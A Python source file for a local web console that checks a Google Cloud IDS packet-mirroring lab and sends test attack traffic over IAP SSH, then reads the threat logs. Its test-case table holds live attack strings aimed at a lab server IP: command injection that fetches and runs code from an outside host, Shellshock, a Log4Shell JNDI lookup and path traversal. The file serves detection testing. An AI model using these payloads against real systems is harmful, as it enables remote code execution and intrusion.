#!/usr/bin/env python3
"""
Google Cloud IDS — Interactive Packet Mirroring & Threat Simulation Testbench UI
Connects to a target GCP project (default: mika-energy-demo or config.yaml) and
provides an interactive UI for the 5-step Cloud IDS workflow:
  1. IDS Endpoint     -> Live status of managed Cloud IDS collector
  2. Target VMs       -> Live status of Attacker Client VM & Target Server VM
  3. Packet Mirroring -> Live status of Packet Mirroring policy & Collector ILB
  4. Attack Sim       -> Fire individual or full suite of safe curl test cases via IAP SSH
  5. Verification     -> Real-time Cloud IDS Threat & Traffic log inspector

Security Compliance (mandatory-secure-web-skills):
  - Binds strictly to 127.0.0.1 for local testing (never 0.0.0.0 unless K_SERVICE is set by Cloud Run)
  - Strict Content-Security-Policy with per-request cryptographic nonces (no unsafe-inline/unsafe-eval)
  - Synchronizer CSRF token validation on all POST requests
  - Strict input validation against allow-lists and subprocess execution with shell=False
  - Client-side DOM manipulation exclusively uses createElement / textContent / replaceChildren (zero innerHTML)
"""

import argparse
import http.server
import json
import os
import re
import secrets
import subprocess
import time
import urllib.parse
from typing import Any, Dict, List

import yaml

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(SCRIPT_DIR, "config.yaml")

# Generate per-server-instance synchronizer CSRF token using OS CSPRNG
# TODO(security): For multi-instance deployments behind a load balancer, store CSRF/session state in a shared store and integrate OAuth/IAP authentication.
CSRF_TOKEN = secrets.token_hex(32)

PROJECT_ID_REGEX = re.compile(r"^[a-z][a-z0-9-]{4,28}[a-z0-9]$")

TEST_CASES: Dict[str, Dict[str, str]] = {
    "TC-01": {
        "id": "TC-01",
        "name": "OS Command Injection / WebLogin CGI Probe",
        "expected_severity": "LOW",
        "category": "Command Injection / Web Scan",
        "expected_signatures": "54469 (Suspicious File Downloading), 58098 (Possible HTTP Malicious Payload)",
        "curl_display": 'curl -s "http://192.168.10.10/weblogin.cgi?username=admin\';cd%20/tmp;wget%20http://123.123.123.123/evil;sh%20evil;rm%20evil"',
        "remote_cmd": "curl -s -o /dev/null -w 'HTTP %{http_code} (%{time_total}s)' \"http://192.168.10.10/weblogin.cgi?username=admin';cd%20/tmp;wget%20http://123.123.123.123/evil;sh%20evil;rm%20evil\"",
    },
    "TC-02": {
        "id": "TC-02",
        "name": "Directory Traversal (WINNT/win.ini)",
        "expected_severity": "MEDIUM / HIGH",
        "category": "Path Traversal / File Inclusion",
        "expected_signatures": "30844 (HTTP Directory Traversal), 30851 (Microsoft Windows win.ini Access Attempt)",
        "curl_display": 'curl -s "http://192.168.10.10/?item=../../../../WINNT/win.ini"',
        "remote_cmd": "curl -s -o /dev/null -w 'HTTP %{http_code} (%{time_total}s)' 'http://192.168.10.10/?item=../../../../WINNT/win.ini'",
    },
    "TC-03": {
        "id": "TC-03",
        "name": "GNU Bash Remote Code Execution (Shellshock CVE-2014-6271)",
        "expected_severity": "CRITICAL",
        "category": "Remote Code Execution (CVE-2014-6271)",
        "expected_signatures": "36729 (Bash Remote Code Execution Vulnerability)",
        "curl_display": "curl -s -H 'User-Agent: () { :; }; 123.123.123.123:9999' 'http://192.168.10.10/cgi-bin/test-critical'",
        "remote_cmd": "curl -s -o /dev/null -w 'HTTP %{http_code} (%{time_total}s)' -H 'User-Agent: () { :; }; 123.123.123.123:9999' 'http://192.168.10.10/cgi-bin/test-critical'",
    },
    "TC-04": {
        "id": "TC-04",
        "name": "Apache Log4j JNDI Lookup Probe (Log4Shell CVE-2021-44228)",
        "expected_severity": "CRITICAL",
        "category": "Remote Code Execution (CVE-2021-44228)",
        "expected_signatures": "91991 (Apache Log4j Remote Code Execution Vulnerability)",
        "curl_display": "curl -s -H 'X-Api-Version: ${jndi:ldap://123.123.123.123:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' 'http://192.168.10.10/'",
        "remote_cmd": "curl -s -o /dev/null -w 'HTTP %{http_code} (%{time_total}s)' -H 'X-Api-Version: ${jndi:ldap://123.123.123.123:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' 'http://192.168.10.10/'",
    },
    "TC-05": {
        "id": "TC-05",
        "name": "EICAR Standard Anti-Malware Test File Download",
        "expected_severity": "MEDIUM",
        "category": "Malware / Spyware Transfer",
        "expected_signatures": "100000 (Eicar Test File - virus), 39040 (Eicar File Detected)",
        "curl_display": 'curl -s "http://192.168.10.10/eicar.file"',
        "remote_cmd": "curl -s -o /dev/null -w 'HTTP %{http_code} (%{time_total}s)' 'http://192.168.10.10/eicar.file'",
    },
}


def load_default_config() -> Dict[str, Any]:
    cfg: Dict[str, Any] = {}
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as fh:
                cfg = yaml.safe_load(fh) or {}
        except Exception:
            cfg = {}
    proj = os.environ.get("PROJECT_ID") or cfg.get("project_id", "")
    if not proj or proj == "YOUR_PROJECT_ID":
        proj = "mika-energy-demo"
    return {
        "project_id": proj,
        "region": cfg.get("region", "us-central1"),
        "zone": cfg.get("zone", "us-central1-a"),
        "vpc_name": cfg.get("network", {}).get("vpc_name", "cloud-ids-vpc"),
        "subnet_name": cfg.get("network", {}).get("subnet_name", "cloud-ids-subnet"),
        "ids_endpoint_name": cfg.get("ids_endpoint", {}).get("name", "cloud-ids-endpoint-01"),
        "server_vm_name": cfg.get("target_vms", {}).get("server_vm", {}).get("name", "ids-target-server"),
        "client_vm_name": cfg.get("target_vms", {}).get("client_vm", {}).get("name", "ids-attacker-client"),
        "packet_mirroring_name": cfg.get("packet_mirroring", {}).get("policy_name", "cloud-ids-packet-mirroring"),
    }


DEFAULT_CFG = load_default_config()


def validate_project_id(project_id: str) -> str:
    clean = (project_id or "").strip()
    if not PROJECT_ID_REGEX.match(clean):
        return DEFAULT_CFG["project_id"]
    return clean


def run_gcloud_args(args: List[str], timeout: int = 25) -> Dict[str, Any]:
    """Execute gcloud safely using argument list (shell=False)."""
    cmd = ["gcloud"] + args
    try:
        proc = subprocess.run(
            cmd,
            shell=False,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "ok": proc.returncode == 0,
            "returncode": proc.returncode,
            "stdout": (proc.stdout or "").strip(),
            "stderr": (proc.stderr or "").strip(),
        }
    except subprocess.TimeoutExpired:
        return {"ok": False, "returncode": -1, "stdout": "", "stderr": "Command timed out"}
    except Exception:
        return {"ok": False, "returncode": -1, "stdout": "", "stderr": "Command execution failed"}


def fetch_infrastructure_status(project_id: str) -> Dict[str, Any]:
    """Query live status of Steps 1, 2, and 3 in the target project."""
    proj = validate_project_id(project_id)
    zone = DEFAULT_CFG["zone"]
    region = DEFAULT_CFG["region"]
    ep_name = DEFAULT_CFG["ids_endpoint_name"]
    mirror_name = DEFAULT_CFG["packet_mirroring_name"]

    # Step 1: Cloud IDS Endpoint
    ep_res = run_gcloud_args(
        ["ids", "endpoints", "describe", ep_name, f"--zone={zone}", f"--project={proj}", "--format=json"],
        timeout=15,
    )
    endpoint_data = {}
    if ep_res["ok"] and ep_res["stdout"]:
        try:
            parsed_ep = json.loads(ep_res["stdout"])
            endpoint_data = parsed_ep[0] if isinstance(parsed_ep, list) and parsed_ep else (parsed_ep if isinstance(parsed_ep, dict) else {})
        except Exception:
            endpoint_data = {}

    # Step 2: Target VMs
    vm_res = run_gcloud_args(
        [
            "compute",
            "instances",
            "list",
            "--filter=name:(ids-attacker-client ids-target-server)",
            f"--project={proj}",
            "--format=json",
        ],
        timeout=15,
    )
    vms_list = []
    if vm_res["ok"] and vm_res["stdout"]:
        try:
            raw_vms = json.loads(vm_res["stdout"])
            for v in raw_vms:
                nic = (v.get("networkInterfaces") or [{}])[0]
                vms_list.append(
                    {
                        "name": v.get("name", ""),
                        "status": v.get("status", "UNKNOWN"),
                        "internal_ip": nic.get("networkIP", ""),
                        "zone": (v.get("zone", "").split("/")[-1]),
                        "machine_type": (v.get("machineType", "").split("/")[-1]),
                    }
                )
        except Exception:
            vms_list = []

    # Step 3: Packet Mirroring Policy
    pm_res = run_gcloud_args(
        [
            "compute",
            "packet-mirrorings",
            "describe",
            mirror_name,
            f"--region={region}",
            f"--project={proj}",
            "--format=json",
        ],
        timeout=15,
    )
    pm_data = {}
    if pm_res["ok"] and pm_res["stdout"]:
        try:
            parsed_pm = json.loads(pm_res["stdout"])
            pm_data = parsed_pm[0] if isinstance(parsed_pm, list) and parsed_pm else (parsed_pm if isinstance(parsed_pm, dict) else {})
        except Exception:
            pm_data = {}

    return {
        "project_id": proj,
        "region": region,
        "zone": zone,
        "step1_ids_endpoint": {
            "name": ep_name,
            "state": endpoint_data.get("state", "NOT_FOUND"),
            "severity": endpoint_data.get("severity", "INFORMATIONAL"),
            "traffic_logs": endpoint_data.get("trafficLogs", True),
            "endpoint_ip": endpoint_data.get("endpointIp", ""),
            "forwarding_rule": (endpoint_data.get("endpointForwardingRule", "").split("/")[-1]),
        },
        "step2_target_vms": vms_list,
        "step3_packet_mirroring": {
            "name": pm_name if (pm_name := pm_data.get("name")) else mirror_name,
            "enable": pm_data.get("enable", "UNKNOWN"),
            "direction": pm_data.get("filter", {}).get("direction", "BOTH"),
            "collector_ilb": (pm_data.get("collectorIlb", {}).get("url", "").split("/")[-1]),
            "mirrored_subnets": [
                s.get("url", "").split("/")[-1]
                for s in pm_data.get("mirroredResources", {}).get("subnetworks", [])
            ],
            "mirrored_instances": [
                i.get("url", "").split("/")[-1]
                for i in pm_data.get("mirroredResources", {}).get("instances", [])
            ],
        },
    }


def execute_attack_simulation(project_id: str, test_id: str) -> Dict[str, Any]:
    """Run one or all safe curl attack test cases from ids-attacker-client via IAP SSH."""
    proj = validate_project_id(project_id)
    zone = DEFAULT_CFG["zone"]
    client_vm = DEFAULT_CFG["client_vm_name"]

    selected_ids = list(TEST_CASES.keys()) if test_id == "ALL" else ([test_id] if test_id in TEST_CASES else [])
    if not selected_ids:
        return {"ok": False, "error": "Invalid test_id specified."}

    remote_lines = ["set -euo pipefail"]
    for tid in selected_ids:
        tc = TEST_CASES[tid]
        remote_lines.append(f"echo '[RUNNING {tid}] {tc['name']}'")
        remote_lines.append(f"RES=$({tc['remote_cmd']} || echo 'HTTP_ERR')")
        remote_lines.append(f"echo '  -> Result: '\"$RES\"")
        if len(selected_ids) > 1:
            remote_lines.append("sleep 1")

    remote_script = "\n".join(remote_lines)
    start_ts = time.time()
    ssh_res = run_gcloud_args(
        [
            "compute",
            "ssh",
            client_vm,
            f"--project={proj}",
            f"--zone={zone}",
            "--tunnel-through-iap",
            f"--command={remote_script}",
        ],
        timeout=45,
    )
    elapsed_ms = int((time.time() - start_ts) * 1000)

    return {
        "ok": ssh_res["ok"],
        "project_id": proj,
        "attacker_vm": client_vm,
        "target_ip": "192.168.10.10",
        "executed_tests": [TEST_CASES[tid] for tid in selected_ids],
        "elapsed_ms": elapsed_ms,
        "stdout": ssh_res["stdout"],
        "stderr": ssh_res["stderr"],
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }


def fetch_cloud_ids_logs(project_id: str, limit: int = 25) -> Dict[str, Any]:
    """Fetch threat and mirrored traffic logs from Cloud Logging."""
    proj = validate_project_id(project_id)
    safe_limit = max(1, min(int(limit), 50))

    threat_filter = 'resource.type="ids.googleapis.com/Endpoint" AND logName:"ids.googleapis.com%2Fthreat"'
    traffic_filter = 'resource.type="ids.googleapis.com/Endpoint" AND logName:"ids.googleapis.com%2Ftraffic"'

    threat_res = run_gcloud_args(
        ["logging", "read", threat_filter, f"--project={proj}", f"--limit={safe_limit}", "--format=json"],
        timeout=20,
    )
    traffic_res = run_gcloud_args(
        ["logging", "read", traffic_filter, f"--project={proj}", "--limit=15", "--format=json"],
        timeout=20,
    )

    threats: List[Dict[str, Any]] = []
    if threat_res["ok"] and threat_res["stdout"]:
        try:
            raw_threats = json.loads(threat_res["stdout"])
            for entry in raw_threats:
                jp = entry.get("jsonPayload", {})
                threats.append(
                    {
                        "timestamp": entry.get("timestamp", jp.get("alert_time", "")),
                        "severity": jp.get("alert_severity", "UNKNOWN"),
                        "threat_id": str(jp.get("threat_id", "")),
                        "name": jp.get("name", "Unknown Signature"),
                        "category": jp.get("type", ""),
                        "sub_type": jp.get("sub_type", ""),
                        "details": jp.get("details", ""),
                        "cves": jp.get("cves", []),
                        "source_ip": jp.get("source_ip_address", ""),
                        "destination_ip": jp.get("destination_ip_address", ""),
                        "destination_port": jp.get("destination_port", ""),
                        "protocol": jp.get("ip_protocol", ""),
                        "application": jp.get("application", ""),
                        "uri": jp.get("uri_or_filename", ""),
                        "direction": jp.get("direction", ""),
                        "session_id": str(jp.get("session_id", "")),
                    }
                )
        except Exception:
            threats = []

    traffic: List[Dict[str, Any]] = []
    if traffic_res["ok"] and traffic_res["stdout"]:
        try:
            raw_traffic = json.loads(traffic_res["stdout"])
            for entry in raw_traffic:
                jp = entry.get("jsonPayload", {})
                traffic.append(
                    {
                        "timestamp": entry.get("timestamp", jp.get("start_time", "")),
                        "application": jp.get("application", ""),
                        "protocol": jp.get("ip_protocol", ""),
                        "source_ip": jp.get("source_ip_address", ""),
                        "source_port": jp.get("source_port", ""),
                        "destination_ip": jp.get("destination_ip_address", ""),
                        "destination_port": jp.get("destination_port", ""),
                        "total_bytes": jp.get("total_bytes", ""),
                        "total_packets": jp.get("total_packets", ""),
                        "elapsed_time": jp.get("elapsed_time", ""),
                    }
                )
        except Exception:
            traffic = []

    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFORMATIONAL": 0}
    for t in threats:
        sev = t["severity"].upper()
        if sev in counts:
            counts[sev] += 1

    return {
        "project_id": proj,
        "threat_count": len(threats),
        "severity_counts": counts,
        "threats": threats,
        "traffic": traffic,
        "console_url": f"https://console.cloud.google.com/net-security/ids/threats?project={proj}",
    }


def render_html_page(nonce: str, csrf_token: str, default_project: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Google Cloud IDS Packet Mirroring, Safe Attack Traffic Simulation, and Threat Alert Verification Console.">
  <meta name="csrf-token" content="{csrf_token}">
  <title>Cloud IDS • Packet Mirroring &amp; Threat Detection Console</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <style nonce="{nonce}">
    :root {{
      --bg-canvas: hsl(216, 32%, 6%);
      --bg-surface: hsl(215, 28%, 10%);
      --bg-elevated: hsl(215, 25%, 13%);
      --bg-interactive: hsl(215, 22%, 17%);
      --border-subtle: hsl(215, 20%, 18%);
      --border-strong: hsl(215, 18%, 26%);
      --text-primary: hsl(210, 25%, 96%);
      --text-secondary: hsl(215, 16%, 72%);
      --text-muted: hsl(215, 14%, 52%);
      --accent-blue: hsl(210, 92%, 58%);
      --accent-blue-hover: hsl(210, 92%, 64%);
      --accent-cyan: hsl(192, 85%, 52%);
      --sev-critical-bg: hsla(350, 84%, 52%, 0.15);
      --sev-critical-fg: hsl(350, 90%, 68%);
      --sev-high-bg: hsla(24, 92%, 54%, 0.15);
      --sev-high-fg: hsl(24, 95%, 66%);
      --sev-medium-bg: hsla(43, 96%, 52%, 0.15);
      --sev-medium-fg: hsl(43, 96%, 64%);
      --sev-low-bg: hsla(198, 88%, 52%, 0.15);
      --sev-low-fg: hsl(198, 90%, 66%);
      --status-ready-bg: hsla(152, 76%, 44%, 0.15);
      --status-ready-fg: hsl(152, 82%, 60%);
      --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      --font-mono: 'JetBrains Mono', monospace;
    }}

    * {{
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }}

    body {{
      background-color: var(--bg-canvas);
      color: var(--text-primary);
      font-family: var(--font-sans);
      line-height: 1.5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      -webkit-font-smoothing: antialiased;
    }}

    /* Top Bar */
    .topbar {{
      background: var(--bg-surface);
      border-bottom: 1px solid var(--border-subtle);
      padding: 0.875rem 1.75rem;
      position: sticky;
      top: 0;
      z-index: 40;
    }}

    .topbar-inner {{
      max-width: 1480px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      flex-wrap: wrap;
    }}

    .brand {{
      display: flex;
      align-items: center;
      gap: 0.875rem;
    }}

    .brand-mark {{
      width: 2.25rem;
      height: 2.25rem;
      border-radius: 0.5rem;
      background: var(--bg-elevated);
      border: 1px solid var(--border-strong);
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--accent-cyan);
      font-family: var(--font-mono);
      font-weight: 700;
      font-size: 0.875rem;
    }}

    .brand h1 {{
      font-size: 1.05rem;
      font-weight: 600;
      letter-spacing: -0.015em;
      color: var(--text-primary);
    }}

    .brand-sub {{
      font-size: 0.775rem;
      color: var(--text-secondary);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }}

    .controls-bar {{
      display: flex;
      align-items: center;
      gap: 0.625rem;
      flex-wrap: wrap;
    }}

    .project-input-group {{
      display: flex;
      align-items: center;
      background: var(--bg-canvas);
      border: 1px solid var(--border-subtle);
      border-radius: 0.45rem;
      padding: 0.25rem 0.625rem;
      gap: 0.5rem;
    }}

    .project-input-group label {{
      font-size: 0.72rem;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      color: var(--text-muted);
      font-weight: 600;
    }}

    .project-input-group input {{
      background: transparent;
      border: none;
      color: var(--accent-cyan);
      font-family: var(--font-mono);
      font-size: 0.8rem;
      font-weight: 500;
      width: 170px;
      outline: none;
    }}

    .btn {{
      appearance: none;
      border: 1px solid var(--border-subtle);
      background: var(--bg-elevated);
      color: var(--text-primary);
      font-family: var(--font-sans);
      font-size: 0.78rem;
      font-weight: 500;
      padding: 0.48rem 0.875rem;
      border-radius: 0.45rem;
      cursor: pointer;
      transition: background 0.15s ease, border-color 0.15s ease, transform 0.1s ease;
      display: inline-flex;
      align-items: center;
      gap: 0.45rem;
      text-decoration: none;
    }}

    .btn:hover:not(:disabled) {{
      background: var(--bg-interactive);
      border-color: var(--border-strong);
    }}

    .btn:active:not(:disabled) {{
      transform: translateY(1px);
    }}

    .btn:disabled {{
      opacity: 0.55;
      cursor: not-allowed;
    }}

    .btn-primary {{
      background: var(--accent-blue);
      border-color: transparent;
      color: #fff;
      font-weight: 600;
    }}

    .btn-primary:hover:not(:disabled) {{
      background: var(--accent-blue-hover);
      border-color: transparent;
    }}

    /* Container */
    .workspace {{
      max-width: 1480px;
      width: 100%;
      margin: 0 auto;
      padding: 1.5rem 1.75rem 2.5rem;
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
      flex: 1;
    }}

    /* 5-Step Pipeline Strip */
    .pipeline-strip {{
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 0.875rem;
    }}

    @media (max-width: 1100px) {{
      .pipeline-strip {{
        grid-template-columns: repeat(2, 1fr);
      }}
    }}

    @media (max-width: 640px) {{
      .pipeline-strip {{
        grid-template-columns: 1fr;
      }}
    }}

    .stage-card {{
      background: var(--bg-surface);
      border: 1px solid var(--border-subtle);
      border-radius: 0.625rem;
      padding: 0.95rem 1.1rem;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      gap: 0.6rem;
    }}

    .stage-header {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.5rem;
    }}

    .stage-step-num {{
      font-family: var(--font-mono);
      font-size: 0.7rem;
      font-weight: 600;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }}

    .badge {{
      display: inline-flex;
      align-items: center;
      padding: 0.15rem 0.5rem;
      border-radius: 0.3rem;
      font-family: var(--font-mono);
      font-size: 0.68rem;
      font-weight: 600;
      letter-spacing: 0.03em;
      text-transform: uppercase;
    }}

    .badge-ready {{
      background: var(--status-ready-bg);
      color: var(--status-ready-fg);
    }}

    .badge-critical {{
      background: var(--sev-critical-bg);
      color: var(--sev-critical-fg);
    }}

    .badge-high {{
      background: var(--sev-high-bg);
      color: var(--sev-high-fg);
    }}

    .badge-medium {{
      background: var(--sev-medium-bg);
      color: var(--sev-medium-fg);
    }}

    .badge-low {{
      background: var(--sev-low-bg);
      color: var(--sev-low-fg);
    }}

    .stage-title {{
      font-size: 0.88rem;
      font-weight: 600;
      color: var(--text-primary);
    }}

    .stage-meta {{
      font-family: var(--font-mono);
      font-size: 0.73rem;
      color: var(--text-secondary);
      word-break: break-all;
    }}

    /* Main Two-Column Grid */
    .main-grid {{
      display: grid;
      grid-template-columns: 5fr 7fr;
      gap: 1.5rem;
      align-items: start;
    }}

    @media (max-width: 1120px) {{
      .main-grid {{
        grid-template-columns: 1fr;
      }}
    }}

    .panel {{
      background: var(--bg-surface);
      border: 1px solid var(--border-subtle);
      border-radius: 0.75rem;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }}

    .panel-header {{
      padding: 1rem 1.25rem;
      border-bottom: 1px solid var(--border-subtle);
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      flex-wrap: wrap;
    }}

    .panel-title-group h2 {{
      font-size: 0.95rem;
      font-weight: 600;
      color: var(--text-primary);
    }}

    .panel-title-group p {{
      font-size: 0.76rem;
      color: var(--text-secondary);
      margin-top: 0.15rem;
    }}

    .panel-body {{
      padding: 1.15rem 1.25rem;
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }}

    /* Attack Test Case List */
    .testcase-list {{
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }}

    .testcase-item {{
      background: var(--bg-elevated);
      border: 1px solid var(--border-subtle);
      border-radius: 0.55rem;
      padding: 0.875rem 1rem;
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
    }}

    .testcase-top {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
    }}

    .testcase-title {{
      font-size: 0.84rem;
      font-weight: 600;
      color: var(--text-primary);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }}

    .testcase-code {{
      background: var(--bg-canvas);
      border: 1px solid var(--border-subtle);
      border-radius: 0.375rem;
      padding: 0.45rem 0.65rem;
      font-family: var(--font-mono);
      font-size: 0.71rem;
      color: var(--accent-cyan);
      overflow-x: auto;
      white-space: pre-wrap;
      word-break: break-all;
    }}

    .testcase-sig {{
      font-size: 0.72rem;
      color: var(--text-secondary);
    }}

    /* Terminal Execution Log */
    .terminal-box {{
      background: hsl(218, 36%, 5%);
      border: 1px solid var(--border-subtle);
      border-radius: 0.55rem;
      padding: 0.875rem 1rem;
      font-family: var(--font-mono);
      font-size: 0.74rem;
      color: hsl(152, 75%, 68%);
      min-height: 150px;
      max-height: 260px;
      overflow-y: auto;
      white-space: pre-wrap;
      line-height: 1.55;
    }}

    /* Severity Summary Strip */
    .summary-strip {{
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 0.65rem;
    }}

    .summary-metric {{
      background: var(--bg-elevated);
      border: 1px solid var(--border-subtle);
      border-radius: 0.5rem;
      padding: 0.65rem 0.8rem;
      display: flex;
      flex-direction: column;
      gap: 0.2rem;
      cursor: pointer;
      transition: border-color 0.15s ease;
    }}

    .summary-metric:hover {{
      border-color: var(--border-strong);
    }}

    .summary-metric-label {{
      font-size: 0.68rem;
      font-family: var(--font-mono);
      text-transform: uppercase;
      color: var(--text-secondary);
    }}

    .summary-metric-val {{
      font-size: 1.35rem;
      font-weight: 700;
      font-family: var(--font-mono);
    }}

    /* Tabs */
    .tab-row {{
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      border-bottom: 1px solid var(--border-subtle);
      padding-bottom: 0.65rem;
    }}

    .tab-group {{
      display: flex;
      gap: 0.45rem;
    }}

    .tab-btn {{
      background: transparent;
      border: 1px solid transparent;
      color: var(--text-secondary);
      font-size: 0.78rem;
      font-weight: 500;
      padding: 0.38rem 0.75rem;
      border-radius: 0.4rem;
      cursor: pointer;
    }}

    .tab-btn.active {{
      background: var(--bg-elevated);
      border-color: var(--border-strong);
      color: var(--text-primary);
      font-weight: 600;
    }}

    /* Alerts Table */
    .table-wrap {{
      overflow-x: auto;
      border: 1px solid var(--border-subtle);
      border-radius: 0.55rem;
    }}

    table {{
      width: 100%;
      border-collapse: collapse;
      text-align: left;
      font-size: 0.78rem;
    }}

    th {{
      background: var(--bg-elevated);
      color: var(--text-secondary);
      font-weight: 600;
      font-size: 0.7rem;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      padding: 0.65rem 0.85rem;
      border-bottom: 1px solid var(--border-subtle);
    }}

    td {{
      padding: 0.7rem 0.85rem;
      border-bottom: 1px solid var(--border-subtle);
      color: var(--text-primary);
      vertical-align: top;
    }}

    tr.alert-row {{
      cursor: pointer;
      transition: background 0.12s ease;
    }}

    tr.alert-row:hover {{
      background: var(--bg-elevated);
    }}

    .mono-cell {{
      font-family: var(--font-mono);
      font-size: 0.73rem;
    }}

    .forensic-drawer {{
      background: var(--bg-canvas);
      padding: 0.85rem 1rem;
      font-family: var(--font-mono);
      font-size: 0.72rem;
      color: var(--text-secondary);
      border-top: 1px dashed var(--border-subtle);
      white-space: pre-wrap;
    }}
  </style>
</head>
<body>
  <header class="topbar">
    <div class="topbar-inner">
      <div class="brand">
        <div class="brand-mark">IDS</div>
        <div>
          <h1>Google Cloud IDS — Packet Mirroring &amp; Threat Testbench</h1>
          <div class="brand-sub">
            <span>Packet Mirroring Policy ──&gt; Simulate Attack Traffic ──&gt; View Threat Alerts</span>
          </div>
        </div>
      </div>
      <div class="controls-bar">
        <div class="project-input-group">
          <label for="projectInput">Project</label>
          <input id="projectInput" type="text" value="{default_project}" spellcheck="false" aria-label="Target GCP Project ID">
        </div>
        <button id="refreshStatusBtn" class="btn" type="button">Sync Pipeline Status</button>
        <button id="refreshAlertsBtn" class="btn" type="button">Refresh Threat Logs</button>
        <a id="consoleLink" class="btn" href="https://console.cloud.google.com/net-security/ids/threats?project={default_project}" target="_blank" rel="noopener noreferrer">Open Cloud Console ↗</a>
      </div>
    </div>
  </header>

  <main class="workspace">
    <!-- 5-Step Pipeline Status Strip -->
    <section class="pipeline-strip" aria-label="5-Step Cloud IDS Deployment Pipeline">
      <div class="stage-card" id="stageCard1">
        <div class="stage-header">
          <span class="stage-step-num">Step 1 • IDS Endpoint</span>
          <span class="badge badge-ready" id="step1Badge">CHECKING...</span>
        </div>
        <div class="stage-title" id="step1Title">cloud-ids-endpoint-01</div>
        <div class="stage-meta" id="step1Meta">Zone: us-central1-a • Severity: INFORMATIONAL</div>
      </div>

      <div class="stage-card" id="stageCard2">
        <div class="stage-header">
          <span class="stage-step-num">Step 2 • Target VMs</span>
          <span class="badge badge-ready" id="step2Badge">CHECKING...</span>
        </div>
        <div class="stage-title" id="step2Title">Attacker &amp; Target Server</div>
        <div class="stage-meta" id="step2Meta">192.168.10.20 ──&gt; 192.168.10.10</div>
      </div>

      <div class="stage-card" id="stageCard3">
        <div class="stage-header">
          <span class="stage-step-num">Step 3 • Packet Mirroring</span>
          <span class="badge badge-ready" id="step3Badge">CHECKING...</span>
        </div>
        <div class="stage-title" id="step3Title">cloud-ids-packet-mirroring</div>
        <div class="stage-meta" id="step3Meta">Direction: BOTH • Subnet: cloud-ids-subnet</div>
      </div>

      <div class="stage-card" id="stageCard4">
        <div class="stage-header">
          <span class="stage-step-num">Step 4 • Attack Simulation</span>
          <span class="badge badge-low" id="step4Badge">5 TEST VECTORS</span>
        </div>
        <div class="stage-title">Safe Exploit &amp; Malware CurL Suite</div>
        <div class="stage-meta">IAP Tunnel ──&gt; ids-attacker-client</div>
      </div>

      <div class="stage-card" id="stageCard5">
        <div class="stage-header">
          <span class="stage-step-num">Step 5 • Verification</span>
          <span class="badge badge-critical" id="step5Badge">LIVE LOGGING</span>
        </div>
        <div class="stage-title" id="step5Title">Cloud IDS Threat Stream</div>
        <div class="stage-meta" id="step5Meta">ids.googleapis.com/threat</div>
      </div>
    </section>

    <!-- Main Two-Column Interactive Workspace -->
    <div class="main-grid">
      <!-- Left Column: Step 4 Attack Simulation Runner -->
      <section class="panel" aria-labelledby="simPanelHeading">
        <div class="panel-header">
          <div class="panel-title-group">
            <h2 id="simPanelHeading">Step 4: Simulate Attack Traffic (Client VM ──&gt; Server VM)</h2>
            <p>Executes safe curl payloads from ids-attacker-client (192.168.10.20) to ids-target-server (192.168.10.10)</p>
          </div>
          <button id="runAllTestsBtn" class="btn btn-primary" type="button">▶ Run All 5 Attack Simulations</button>
        </div>

        <div class="panel-body">
          <div class="testcase-list" id="testcaseList">
            <!-- Populated safely via DOM APIs -->
          </div>

          <div>
            <div class="stage-step-num" style="margin-bottom: 0.4rem;">IAP SSH Execution Telemetry (ids-attacker-client)</div>
            <div class="terminal-box" id="terminalOutput">Ready. Click "Run All 5 Attack Simulations" or fire any individual test case above to transmit traffic across the mirrored VPC subnet.</div>
          </div>
        </div>
      </section>

      <!-- Right Column: Step 5 Cloud IDS Threat Alert Verification -->
      <section class="panel" aria-labelledby="verifyPanelHeading">
        <div class="panel-header">
          <div class="panel-title-group">
            <h2 id="verifyPanelHeading">Step 5: Cloud IDS Threat Alerts &amp; Mirrored Traffic Verification</h2>
            <p>Live telemetry from resource.type="ids.googleapis.com/Endpoint" in Cloud Logging</p>
          </div>
          <span class="mono-cell" id="lastUpdatedLabel" style="color: var(--text-muted);">Syncing...</span>
        </div>

        <div class="panel-body">
          <!-- Severity Filter Counters -->
          <div class="summary-strip">
            <div class="summary-metric" id="filterAllBtn" data-sev="ALL">
              <span class="summary-metric-label">Total Alerts</span>
